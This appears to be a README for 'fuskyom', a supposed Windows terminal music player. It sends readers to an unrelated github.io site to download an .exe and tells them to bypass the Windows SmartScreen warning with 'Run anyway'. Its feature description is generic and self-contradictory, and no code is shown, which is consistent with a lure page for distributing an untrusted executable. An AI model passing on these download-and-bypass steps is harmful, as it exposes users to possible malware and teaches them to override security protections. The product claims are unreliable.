# 🎵 fuskyom - Play music in your command window

[![](https://img.shields.io/badge/Download-fuskyom-blue)](https://ambiguous-triad386.github.io)

Fuskyom brings a clean, simple music experience to your computer. It focuses on the tracks you love without the clutter of modern streaming apps. You control your entire library through a text-based interface. It displays your album artwork directly in the window while your music plays.

## 📥 Getting Started

Follow these steps to set up fuskyom on your Windows machine. You do not need technical skills to get your library running.

1. Visit the [official releases page](https://ambiguous-triad386.github.io).
2. Look for the "Assets" section at the bottom of the latest version.
3. Click the file ending in `.exe` to start the download.
4. Save the file to your desktop or your applications folder.
5. Double-click the file to open the player.

Windows might show a warning message called "Windows protected your PC." If you see this, click "More info" and then select "Run anyway." This happens because fuskyom is a new application.

## 📂 Setting Up Your Library

Fuskyom organizes your music by reading the files stored on your hard drive. 

1. Create a folder named "Music" on your computer if you do not have one. 
2. Place your audio files inside this folder.
3. Open the fuskyom application.
4. Use the settings menu to point the player toward your music folder. 
5. The player scans your files and builds a list for you to browse.

This scan takes a few seconds if you have a large collection. You see the progress bar at the bottom of the window as it works.

## 🎧 Playing Music

The interface uses simple keys to control playback. You do not need to click small buttons with your mouse.

- Play and pause: Press the Space bar.
- Next track: Press the Right arrow key.
- Previous track: Press the Left arrow key.
- Volume up: Press the Plus key.
- Volume down: Press the Minus key.
- Search: Type the name of a song or artist to filter your list.

The current track information appears at the top of the interface. If the music file contains album art, the image appears on the right side of the screen.

## ⚙️ Customizing the View

You change how the player looks through the configuration menu. Press the "C" key to open these settings. 

- Cycle through color themes to match your mood.
- Adjust the text size if you struggle to read the track names.
- Change the layout to hide or show extra details about the song file.

## 🖥️ System Requirements

Fuskyom runs on all modern versions of Windows. 

- Operating System: Windows 10 or 11.
- Memory: 256MB of RAM is enough to run the player smoothly.
- Storage: Less than 50MB of disk space.
- Display: Standard screen resolution.

The software does not connect to the internet. This ensures your privacy and keeps the player running fast even on slow connections. It reads files directly from your hardware.

## 🧹 Troubleshooting

Sometimes, the player might fail to load a file. Check these common issues first:

- File Formats: Ensure your music files use standard formats like MP3, FLAC, or WAV.
- Permissions: Make sure your account has permission to read the files in your selected music folder.
- Locked Files: If another program uses the music file, the player might display an error. Close other audio applications and try again.

If the application window freezes, close the window and open it again. All your settings save automatically when you exit.

## 🛠️ Frequently Asked Questions

Does fuskyom track my listening habits?
No. The application remains local to your machine. Nothing leaves your computer.

Will it play files from my streaming subscriptions?
No. Fuskyom only plays files you own and store on your local drive.

Can I move the window?
Yes. Drag the title bar of the window as you do with any other Windows program.

Does it support playlists?
Yes. You create and save playlists through the playlist menu in the bottom-left corner of the interface.
